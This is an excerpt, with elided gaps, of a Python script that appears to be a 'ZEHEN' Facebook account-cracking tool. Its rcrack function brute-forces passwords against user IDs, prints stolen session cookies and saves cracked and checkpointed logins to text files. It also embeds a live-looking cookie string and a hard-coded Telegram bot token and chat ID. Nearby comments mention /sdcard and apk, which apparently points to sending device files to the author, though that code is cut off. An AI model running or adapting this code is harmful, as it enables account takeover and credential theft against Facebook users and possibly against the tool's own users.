...
os.system('xdg-open https://t.me/ZEHENfree')
print('\n\033[1;36m[✓]   WELCOME TO ZEHEN TOOL');time.sleep(3)
...
def clear():
	clr('clear')
	print(logo)
	print('\033[1;37m\033[1;32m[💕] WELCOME TO ZEHENN TOOLS [💖]\033[1;0m\33[1;32m')
	linex()
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=zzUaZfbEupCA9U_c2Yr5A46G; sb=zzUaZVvE4UMk72gB_D-1tLnN; locale=en_US; vpd=v1%3B898x501x2.875; dpr=3.16090989112854; m_pixel_ratio=3.16090989112854; wd=891x1597; fr=1k23emWzeDtMTrkGC.AWUzK2qqRxUq7YROFeW17oTSccw.BlRI8a.Ac.AAA.0.0.BlSkem.AWXnnaJPUIg',
    'dpr': '2.875',
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ZEHEN-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('ZEHEN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ZEHEN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('ZEHEN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;96m[ZEHEN-TEAM]\033[1;97m] %s|\33[1;34m[SUCCESS]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def suyaib():
    ...
    bot_token = '6929582850:AAH6qaMGvjpXB1HGmFIxXtLhDxR5gAe0BPQ' 
    chat_id = '6118669955'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
